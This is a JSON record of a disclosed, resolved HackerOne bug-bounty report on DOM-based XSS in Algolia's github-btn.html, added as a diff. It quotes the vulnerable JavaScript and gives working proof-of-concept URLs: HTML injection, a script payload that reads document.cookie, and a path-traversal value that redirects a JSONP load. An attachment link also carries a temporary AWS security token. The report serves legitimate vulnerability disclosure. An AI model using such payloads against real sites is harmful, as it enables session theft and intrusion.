@@ -1,0 +1,127 @@
+{
+  "id": 200826,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDA4MjY=",
+  "url": "https://hackerone.com/reports/200826",
+  "title": "[github.algolia.com] DOM Based XSS github-btn.html",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-01-24T15:45:48.165Z",
+  "submitted_at": "2017-01-24T15:45:48.165Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bobrov",
+    "url": "/bobrov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 443,
+    "url": "https://hackerone.com/algolia",
+    "handle": "algolia",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Algolia",
+      "twitter_handle": "algolia",
+      "website": "https://algolia.com",
+      "about": "Hosted search API that delivers instant and relevant results from the first keystroke"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-31T19:42:12.862Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-01T19:42:09.698Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n===\n\n**Vulnerable parameter:** user\n**Vulnerable script:** https://github.algolia.com/github-btn.html\n**Vulnerable code:**\n```js\n        var params = function() {\n                for (var t, e = [], o = window.location.href.slice(window.location.href.indexOf(\"?\") + 1).split(\"&\"), r = 0; r < o.length; r++) t = o[r].split(\"=\"), e.push(t[0]), e[t[0]] = t[1];\n                return e\n            }(),\n            user = params.user,\n            repo = params.repo,\n            type = params.type,\n ...\n  \"follow\" == type && (mainButton.className += \" github-me\", text.innerHTML = \"Follow @\" + user, button.href = \"https://github.com/\" + user\n```\n\nPoCs\n===\n\n**PoC #1**\nHTML Injection for Chrome, Internet Explorer\n\n```\nhttps://github.algolia.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow\n```\n\n**PoC #2**\nXSS for Internet Explorer (using X-UA-Compatible IE=9)\n\n```\nhttps://blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://github.algolia.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E\n```\n\n\nAnother vulns\n===\n\nAlso, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.\nBut for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).\n\n```js\nfunction jsonp(t) {\n  var e = document.createElement(\"script\");\n  e.src = t + \"?callback=callback\", head.insertBefore(e, head.firstChild)\n}\n...\njsonp(\"follow\" == type ? \"https://api.github.com/users/\" + user : \"https://api.github.com/repos/\" + user + \"/\" + repo);\n```\n\n**PoC**\n\n```\nhttps://github.algolia.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork\n```\n\n**Result**\n```\nhttps://api.github.com/another/endpoint?callback=callback\n```",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 154745,
+      "file_name": "Screenshot_at_19-44-33.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/154/745/a0cb40cc10447d534b4c77f2d38bc765e08c5563/Screenshot_at_19-44-33.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_19-44-33.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_19-44-33.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123337Z&X-Amz-Expires=1072&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0b0dca469d1a8d73bfffac485d41d4b3fb48c900ea8dedeade2d3dfc177a24ea",
+      "file_size": 19733,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-03-31T19:42:09.726Z",
+  "allow_singular_disclosure_after": -216838288.07836708,
+  "singular_disclosure_allowed": true,
+  "vote_count": 14,
+  "voters": [
+    "delimitry",
+    "bogdantcaciuc",
+    "bobrov",
+    "hunter",
+    "madrobot",
+    "mpz",
+    "eveeez",
+    "linkks",
+    "japz",
+    "sumit7",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
